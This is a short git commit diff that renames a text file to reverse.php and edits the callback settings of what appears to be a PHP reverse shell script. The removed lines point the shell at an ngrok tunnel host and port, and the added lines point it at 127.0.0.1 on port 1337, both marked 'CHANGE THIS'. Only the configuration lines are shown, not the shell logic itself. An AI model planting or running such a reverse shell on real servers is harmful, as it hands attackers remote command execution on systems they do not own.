1bf96a5694bd69a6bb541ed37d5c81dc92b1bf3e
LOveSk8 <42890504+LOveSk8@users.noreply.github.com>
2020-03-26 00:22:30 +0800

    Update and rename rev (1).txt to reverse.php

--- reverse.php
+++ reverse.php
@@ -46,8 +46,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '0.tcp.ngrok.io';  // CHANGE THIS
-$port = 18664;       // CHANGE THIS
+$ip = '127.0.0.1';  // CHANGE THIS
+$port = 1337;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
